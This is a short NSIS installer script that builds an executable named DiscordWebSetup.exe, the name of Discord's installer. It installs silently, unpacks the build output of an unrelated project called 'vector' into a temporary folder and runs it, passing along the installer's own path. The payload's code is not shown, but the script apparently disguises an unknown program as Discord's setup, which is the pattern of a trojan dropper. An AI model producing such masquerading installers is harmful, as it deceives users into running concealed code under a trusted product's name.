Name "vector"
OutFile DiscordWebSetup.exe
Icon "app.ico"
RequestExecutionLevel user
SilentInstall silent

Section

InitPluginsDir
SetOutPath "$PLUGINSDIR"

File /r C:\Users\Matthew\source\repos\vector\vector\bin\Release\net6.0-windows\*

ExecWait '$PLUGINSDIR/vector.exe $EXEDIR\$EXEFILE'
SectionEnd

